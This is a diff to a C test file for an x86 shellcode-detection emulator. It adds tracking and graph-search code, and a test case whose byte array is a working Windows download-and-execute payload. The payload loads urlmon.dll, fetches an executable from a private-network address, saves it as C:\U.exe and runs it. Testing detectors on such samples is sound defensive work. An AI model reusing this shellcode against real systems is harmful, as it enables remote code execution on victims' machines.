@@ -691,7 +691,37 @@ struct instr_test tests[] =
 		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
 		.in_state.mem_state = {0, 0},
 	},
+	{
+		.instr = "tills neuer",
+		.code =  
+		"\xeb\x54\x8b\x75\x3c\x8b\x74\x35\x78\x03\xf5\x56\x8b\x76\x20\x03"	 // 0x0020  .T.u<.t5  x..V.v ."
+		"\xf5\x33\xc9\x49\x41\xad\x33\xdb\x36\x0f\xbe\x14\x28\x38\xf2\x74"	 // 0x0030  .3.IA.3.  6...(8.t"
+		"\x08\xc1\xcb\x0d\x03\xda\x40\xeb\xef\x3b\xdf\x75\xe7\x5e\x8b\x5e"	 // 0x0040  ......@.  .;.u.^.^"
+		"\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e\x1c\x03\xdd\x8b\x04\x8b\x03"	 // 0x0050  $..f..K.  ^......."
+		"\xc5\xc3\x75\x72\x6c\x6d\x6f\x6e\x2e\x64\x6c\x6c\x00\x43\x3a\x5c"	 // 0x0060  ..urlmon  .dll.C:\"
+		"\x55\x2e\x65\x78\x65\x00\x33\xc0\x64\x03\x40\x30\x78\x0c\x8b\x40"	 // 0x0070  U.exe.3.  d.@0x..@"
+		"\x0c\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c"	 // 0x0080  ..p...@.  ...@4.@|"
+		"\x8b\x40\x3c\x95\xbf\x8e\x4e\x0e\xec\xe8\x84\xff\xff\xff\x83\xec"	 // 0x0090  .@<...N.  ........"
+		"\x04\x83\x2c\x24\x3c\xff\xd0\x95\x50\xbf\x36\x1a\x2f\x70\xe8\x6f"	 // 0x00a0  ..,$<...  P.6./p.o"
+		"\xff\xff\xff\x8b\x54\x24\xfc\x8d\x52\xba\x33\xdb\x53\x53\x52\xeb"	 // 0x00b0  ....T$..  R.3.SSR."
+		"\x24\x53\xff\xd0\x5d\xbf\x98\xfe\x8a\x0e\xe8\x53\xff\xff\xff\x83"	 // 0x00c0  $S..]...  ...S...."
+		"\xec\x04\x83\x2c\x24\x62\xff\xd0\xbf\xef\xce\xe0\x60\xe8\x40\xff"	 // 0x00d0  ...,$b..  ....`.@."
+		"\xff\xff\x52\xff\xd0\xe8\xd7\xff\xff\xff\x68\x74\x74\x70\x3a\x2f"	 // 0x00e0  ..R.....  ..http:/"
+		"\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x34\x2e\x34\x36\x3a\x35"	 // 0x00f0  /192.168  .14.46:5"
+		"\x35\x30\x33\x38\x2f\x6d\x64\x6e\x65\x78\x2e\x65\x78\x65\x00\x00"	 // 0x0100  5038/mdn  ex.exe.."
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	 // 0x0110  ........  ........"
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	 // 0x0120  ........  ........"
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	 // 0x0130  ........  ........"
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	 // 0x0140  ........  ........"
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	 // 0x0150  ........  ........"
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	 // 0x0160  ........  ........"
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	 // 0x0170  ........  ........"
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",	  // 0x0180  ........  ........"
 
+		.codesize = 0x180,
+		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
+		.in_state.mem_state = {0, 0},
+	},
 	/*{
 		.instr = "",
 		.code =  
@@ -1193,6 +1223,82 @@ int test(int n)
 	return 0;
 }
 
+#include <emu/emu_track.h>
+
+void bfs_from_getpc(struct emu_vertex *ev)
+{
+	printf("%s\n",((struct emu_track_instr_info *)ev->data)->instrstring);
+
+	struct emu_edge *ee;
+	for ( ee = emu_edges_first(ev->backedges); !emu_edges_attail(ee); ee = emu_edges_next(ee) )
+	{
+		if (ee->destination->color == white)
+			bfs_from_getpc(ee->destination);
+	}
+
+	if (emu_edges_length(ev->backedges) == 0)
+	{
+		ev->color = grey;
+	}else
+	{
+		ev->color = black;
+	}
+	
+
+}
+
+int32_t run_and_track(struct emu *e, struct emu_track *et, struct emu_env_w32 *env)
+{
+	int ret = -1;
+	int track = 0;
+	int j;
+	/* run the code */
+	for ( j=0;j<opts.steps;j++ )
+	{
+		uint32_t eipsave = emu_cpu_eip_get(emu_cpu_get(e));
+
+		struct emu_env_w32_dll_export *dllhook = NULL;
+
+		ret = 0;
+		eipsave = emu_cpu_eip_get(emu_cpu_get(e));
+
+		dllhook = emu_env_w32_eip_check(env);
+
+		if ( dllhook != NULL )
+		{
+
+		}
+		else
+		{
+
+			ret = emu_cpu_parse(emu_cpu_get(e));
+
+
+			if ( ret != -1 )
+			{
+				ret = emu_cpu_step(emu_cpu_get(e));
+			}
+
+			if ( ret != -1 )
+			{
+				track = emu_track_instruction_check(e, et);
+				if( track == -1)
+					break;
+			}
+
+			if ( ret == -1 )
+			{
+				printf("cpu error %s\n", emu_strerror(e));
+				break;
+			}
+		}
+
+	}
+
+	printf("stepcount %i\n",j);
+	return j;
+}
+
 int getpctest(int n)
 {
 	int i=0;
@@ -1200,6 +1306,7 @@ int getpctest(int n)
 	struct emu_cpu *cpu = emu_cpu_get(e);
 	struct emu_memory *mem = emu_memory_get(e);
 	struct emu_env_w32 *env = emu_env_w32_new(e);
+	struct emu_track *et = emu_track_new();
 
 	if ( env == 0 )
 	{
@@ -1228,28 +1335,25 @@ int getpctest(int n)
 		if ( n != -1 && i != n )
 			continue;
 
+		printf("testing (#%d) '%s' \n", i, tests[i].instr);
+
 		uint32_t offset;
 		for ( offset=0; offset<tests[i].codesize;offset++ )
 		{
 
 			if ( emu_getpc_check(e, (uint8_t *)tests[i].code, tests[i].codesize, offset) == 1 )
 			{
-				int failed = 0;
+                int failed = 0;
 
 
-				printf("testing (#%d) '%s' \t", i, tests[i].instr);
 				int j=0;
 
 				/* set the registers to the initial values */
 				for ( j=0;j<8;j++ )
-				{
 					emu_cpu_reg32_set(cpu,j ,tests[i].in_state.reg[j]);
-				}
-
 
 				/* set the flags */
 				emu_cpu_eflags_set(cpu,tests[i].in_state.eflags);
-
 
 				/* write the code to the offset */
 				int static_offset = CODE_OFFSET;
@@ -1260,136 +1364,111 @@ int getpctest(int n)
 
 
 
-				/* set eip to the code */
-				emu_cpu_eip_set(emu_cpu_get(e), static_offset);
+				/* set eip to the getpc code */
+				emu_cpu_eip_set(emu_cpu_get(e), static_offset+offset);
+
+				int ret = -1;
+				int track = 0;
 
 				/* run the code */
-				if ( opts.verbose == 1 )
-				{
-					emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
-					emu_cpu_debug_print(cpu);
-					emu_log_level_set(emu_logging_get(e),EMU_LOG_NONE);
-				}
-
-				int ret; //= emu_cpu_run(emu_cpu_get(e));
-
 				for ( j=0;j<opts.steps;j++ )
 				{
+					uint32_t eipsave = emu_cpu_eip_get(emu_cpu_get(e));
 
-					if ( opts.verbose == 1 )
-					{
-						emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
-						emu_cpu_debug_print(cpu);
-						emu_log_level_set(emu_logging_get(e),EMU_LOG_NONE);
-					}
+					struct emu_env_w32_dll_export *dllhook = NULL;
 
+					ret = 0;
+					eipsave = emu_cpu_eip_get(emu_cpu_get(e));
 
-					struct emu_env_w32_dll_export *dllhook = emu_env_w32_eip_check(env);
+					dllhook = emu_env_w32_eip_check(env);
+
 					if ( dllhook != NULL )
-						continue;
-
-					ret = emu_cpu_parse(emu_cpu_get(e));
-
-
-
-					if ( ret != -1 )
 					{
-						ret = emu_cpu_step(emu_cpu_get(e));
+
+					}
+					else
+					{
+
+						ret = emu_cpu_parse(emu_cpu_get(e));
+
+						if ( ret != -1 )
+						{
+							track = emu_track_instruction_check(e, et);
+							if( track == -1)
+								break;
+						}
+
+						if ( ret != -1 )
+						{
+							ret = emu_cpu_step(emu_cpu_get(e));
+						}
+
+						if ( ret == -1 )
+						{
+							printf("cpu error %s\n", emu_strerror(e));
+							break;
+						}
 					}
 
-					if ( ret == -1 )
-					{
-						printf("cpu error %s\n", emu_strerror(e));
-						break;
-					}
-
-
-
-					printf("\n");
 				}
 
 				printf("stepcount %i\n",j);
-
-
-				if ( opts.verbose == 1 )
+/*
+				#define MAX_STARTS 20
+				uint32_t possible_starts[MAX_STARTS]
+				uint32_t max_start = 0;
+*/
+				if (track == -1)
 				{
-					emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
-					emu_cpu_debug_print(cpu);
-					emu_log_level_set(emu_logging_get(e),EMU_LOG_NONE);
-				}
+					printf("FOX\n");
+					emu_track_tree_create(e, et, static_offset, tests[i].codesize);
 
-
-				/* check the registers for the exptected values */
-
-				for ( j=0;j<8;j++ )
-				{
-					if ( emu_cpu_reg32_get(cpu, j) ==  tests[i].out_state.reg[j] )
+					struct emu_vertex *ev;
+					for ( ev = emu_vertexes_first(et->trackgraph->vertexes); !emu_vertexes_attail(ev); ev = emu_vertexes_next(ev) )
 					{
-						if ( opts.verbose == 1 )
-							printf("\t %s "SUCCESS"\n",regm[j]);
+						ev->color = white;
 					}
-					else
+
+					for ( ev = emu_vertexes_first(et->trackgraph->vertexes); !emu_vertexes_attail(ev); ev = emu_vertexes_next(ev) )
 					{
-						printf("\t %s "FAILED" got 0x%08x expected 0x%08x\n",regm[j],emu_cpu_reg32_get(cpu, j),tests[i].out_state.reg[j]);
-						failed = 1;
+						bfs_from_getpc(ev);
 					}
-				}
 
+					struct emu_hashtable_item *ehi = emu_hashtable_search(et->instrtable, (void *)(static_offset+offset));
 
-				/* check the memory for expected values */
-				uint32_t value;
-
-				if ( tests[i].out_state.mem_state[0] != 0 ||  tests[i].out_state.mem_state[1] != 0 )
-				{
-					if ( emu_memory_read_dword(mem,tests[i].out_state.mem_state[0],&value) == 0 )
+					if (ehi != NULL)
 					{
-						if ( value == tests[i].out_state.mem_state[1] )
+						ev = (struct emu_vertex *)ehi->value;
+
+
+						for ( ev = emu_vertexes_first(et->trackgraph->vertexes); !emu_vertexes_attail(ev); ev = emu_vertexes_next(ev) )
 						{
-							if ( opts.verbose == 1 )
-								printf("\t memory "SUCCESS" 0x%08x = 0x%08x\n",tests[i].out_state.mem_state[0], tests[i].out_state.mem_state[1]);
+							if ( ev->color == grey )
+							{
+								printf("POSSIBLE\n");
+								struct emu_track_instr_info *etii = (struct emu_track_instr_info *)ev->data;
+
+								for ( j=0;j<8;j++ )
+									emu_cpu_reg32_set(cpu,j ,tests[i].in_state.reg[j]);
+								emu_cpu_eflags_set(cpu,tests[i].in_state.eflags);
+								int static_offset = CODE_OFFSET;
+								for ( j = 0; j < tests[i].codesize; j++ )
+									emu_memory_write_byte(mem, static_offset+j, tests[i].code[j]);
+
+								
+								emu_cpu_eip_set(emu_cpu_get(e), etii->eip);
+								if (run_and_track(e, et, env) > 10)
+								{
+									goto done;
+								}
+
+							}
 						}
-						else
-						{
-							printf("\t memory "FAILED" at 0x%08x got 0x%08x expected 0x%08x\n",tests[i].out_state.mem_state[0],value, tests[i].out_state.mem_state[1]);
-							failed = 1;
-						}
-
-					}
-					else
-					{
-						printf("\tmemory "FAILED" emu says: '%s' when accessing %08x\n", strerror(emu_errno(e)),tests[i].out_state.mem_state[0]);
-						failed = 1;
 					}
 
 				}
 
-				/* check the cpu flags for expected values */
-				if ( tests[i].out_state.eflags != emu_cpu_eflags_get(cpu) )
-				{
-					printf("\t flags "FAILED" got %08x expected %08x\n",emu_cpu_eflags_get(cpu),tests[i].out_state.eflags);
-					for ( j=0;j<32;j++ )
-					{
-						uint32_t f = emu_cpu_eflags_get(cpu);
-						if ( (tests[i].out_state.eflags & (1 << j)) != (f & (1 <<j)) )
-							printf("\t flag %s (bit %i) failed, expected %i is %i\n",flags[j], j, 
-								   (tests[i].out_state.eflags & (1 << j)),
-								   (f & (1 <<j)));
-					}
-
-					failed = 1;
-				}
-				else
-				{
-					if ( opts.verbose == 1 )
-						printf("\t flags "SUCCESS"\n");
-				}
-
-
-				if ( tests[i].out_state.eip != 0 && tests[i].out_state.eip != emu_cpu_eip_get(cpu) )
-				{
-					printf("\t %s "FAILED" got 0x%08x expected 0x%08x\n", "eip", emu_cpu_eip_get(cpu), tests[i].out_state.eip);
-					failed = 1;
-				}
+done:
 
 
 				/* bail out on *any* error */
@@ -1401,11 +1480,8 @@ int getpctest(int n)
 				{
 					return -1;
 				}
-
-
 			}
 		}
-
 	}
 	emu_free(e);
 	return 0;
